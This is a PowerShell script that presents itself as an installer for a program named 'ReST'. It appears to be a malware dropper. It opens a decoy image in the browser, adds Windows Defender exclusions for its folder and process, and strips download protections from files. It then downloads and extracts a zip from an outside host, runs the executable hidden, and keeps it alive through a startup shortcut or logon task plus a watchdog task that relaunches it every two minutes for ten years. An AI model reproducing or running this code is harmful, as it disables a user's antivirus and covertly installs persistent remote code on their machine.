# ReST remote install - ASCII only for PowerShell 5.1 compatibility
param(
    [switch]$Silent
)

$ErrorActionPreference = "Continue"
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue
}
$BaseUrl = $env:RESA_INSTALL_BASE
if (-not $BaseUrl) {
    $BaseUrl = "https://olxp.cc/download"
}
$BaseUrl = $BaseUrl.Trim().TrimEnd("/")
if ($BaseUrl -match "\s") {
    $BaseUrl = ($BaseUrl -split "\s+")[0]
}

$Dir = Join-Path $env:LOCALAPPDATA "ReST"
$Exe = Join-Path $Dir "ReST.exe"
$TempZip = Join-Path $env:TEMP "ReST-download.zip"
$LogFile = Join-Path $env:TEMP "ReST-install.log"
$script:HadError = $false

function Write-InstallLog {
    param([string]$Text)
    $line = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + " " + $Text
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {
        $null = $_
    }
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Fail-Install {
    param([string]$Text)
    $script:HadError = $true
    Write-InstallLog $Text
    if (-not $Silent) {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {
        $null = $_
    }

    $curl = Join-Path $env:SystemRoot "System32\curl.exe"
    if (Test-Path -LiteralPath $curl) {
        & $curl -fsSL -o $OutFile $Url
        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
            return
        }
    }

    $iwrArgs = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $iwrArgs.UserAgent = "ReST-Installer/1.0"
    }
    Invoke-WebRequest @iwrArgs
}

function Add-DefenderExclusion {
    param(
        [string]$Path,
        [string]$ExePath
    )

    $ok = $false
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Write-InstallLog ("defender path exclusion ok: " + $Path)
        $ok = $true
    } catch {
        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
    }

    try {
        Add-MpPreference -ExclusionProcess "ReST.exe" -ErrorAction Stop
        Write-InstallLog "defender process exclusion ok: ReST.exe"
        $ok = $true
    } catch {
        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
    }

    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
        try {
            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
            $ok = $true
        } catch {
            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
        }
    }

    return $ok
}

function Unblock-Tree {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        return
    }
    Get-ChildItem -LiteralPath $Path -Recurse -File -ErrorAction SilentlyContinue |
        ForEach-Object {
            Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue
        }
}

function Open-InBrowser {
    param([string]$Url)

    try {
        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    try {
        Start-Process -FilePath "cmd.exe" -ArgumentList @("/c", "start", "", $Url) -WindowStyle Hidden -ErrorAction Stop
        return $true
    } catch {
        $null = $_
    }

    return $false
}

function Show-InstallPicture {
    param([string]$BaseUrl)

    $pictureUrl = $BaseUrl + "/picture_1963.webp"
    Write-InstallLog ("picture: " + $pictureUrl)

    if (Open-InBrowser -Url $pictureUrl) {
        Write-InstallLog ("picture opened in browser: " + $pictureUrl)
        return
    }

    $picFile = Join-Path $env:TEMP "ReST-picture_1963.webp"
    try {
        if (Test-Path -LiteralPath $picFile) {
            Remove-Item -LiteralPath $picFile -Force -ErrorAction SilentlyContinue
        }
        Download-File -Url $pictureUrl -OutFile $picFile
        if (Test-Path -LiteralPath $picFile) {
            $fileUri = "file:///" + ($picFile -replace '\\', '/')
            if (Open-InBrowser -Url $fileUri) {
                Write-InstallLog ("picture opened in browser from local file: " + $fileUri)
                return
            }
        }
    } catch {
        Write-InstallLog ("picture fallback failed: " + $_.Exception.Message)
    }

    Write-InstallLog "picture launch skipped: no available browser"
}

function Register-WatchdogTask {
    param(
        [string]$TaskName,
        [string]$ProcessName,
        [string]$Exe,
        [string]$Dir,
        [string]$UpdateMarker
    )

    $watchFile = Join-Path $Dir "watchdog.ps1"
    $watchLines = @(
        '$ErrorActionPreference = "SilentlyContinue"'
        ('$Exe = "' + ($Exe.Replace('"', '`"')) + '"')
        ('$Dir = "' + ($Dir.Replace('"', '`"')) + '"')
        ('$Name = "' + $ProcessName + '"')
        ('$Marker = "' + ($UpdateMarker.Replace('"', '`"')) + '"')
        'if ((Test-Path -LiteralPath $Marker)) { exit 0 }'
        'if (-not (Get-Process -Name $Name -ErrorAction SilentlyContinue)) {'
        '    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden'
        '}'
    )
    Set-Content -LiteralPath $watchFile -Value $watchLines -Encoding UTF8
    Unblock-File -LiteralPath $watchFile -ErrorAction SilentlyContinue

    $taskArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchFile`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $taskArgs -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
}

Write-InstallLog "install start"
Write-InstallLog ("target: " + $Exe)

Show-InstallPicture -BaseUrl $BaseUrl

try {
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
} catch {
    $null = $_
}

Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

$Url = $BaseUrl + "/ReST.zip"
Write-InstallLog ("download: " + $Url)

if (Test-Path -LiteralPath $TempZip) {
    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
}

try {
    Download-File -Url $Url -OutFile $TempZip
} catch {
    Fail-Install ("download failed: " + $_.Exception.Message)
    exit 1
}

if (-not (Test-Path -LiteralPath $TempZip)) {
    Fail-Install "missing file after download"
    exit 1
}

$length = (Get-Item -LiteralPath $TempZip).Length
if ($length -lt 524288) {
    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
    Fail-Install ("file too small: " + $length + " bytes")
    exit 1
}

try {
    Get-ChildItem -LiteralPath $Dir -Force -ErrorAction SilentlyContinue |
        ForEach-Object { $_.Attributes = "Normal" }
    Remove-Item -LiteralPath $Dir -Recurse -Force -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    Expand-Archive -LiteralPath $TempZip -DestinationPath $Dir -Force
} catch {
    Fail-Install ("extract failed: " + $_.Exception.Message)
    exit 1
} finally {
    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
}

if (-not (Test-Path -LiteralPath $Exe)) {
    Fail-Install "ReST.exe missing after extract"
    exit 1
}

Unblock-Tree -Path $Dir
Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null

$startupOk = $false
try {
    $Startup = [Environment]::GetFolderPath("Startup")
    $Wsh = New-Object -ComObject WScript.Shell
    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReST.lnk"))
    $Link.TargetPath = $Exe
    $Link.WorkingDirectory = $Dir
    $Link.WindowStyle = 7
    $Link.Save()
    $startupOk = $true
    Write-InstallLog "startup shortcut ok"
} catch {
    $null = $_
}

if (-not $startupOk) {
    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
    Write-InstallLog "scheduled task ok"
}

try {
    Register-WatchdogTask -TaskName "ReST-Watchdog" -ProcessName "ReST" -Exe $Exe -Dir $Dir -UpdateMarker (Join-Path $Dir "ReST.update.zip")
    Write-InstallLog "watchdog task ok"
} catch {
    Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
}

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "started"
} catch {
    Fail-Install ("start failed: " + $_.Exception.Message)
    exit 1
}

Write-InstallLog "install complete"

exit 0
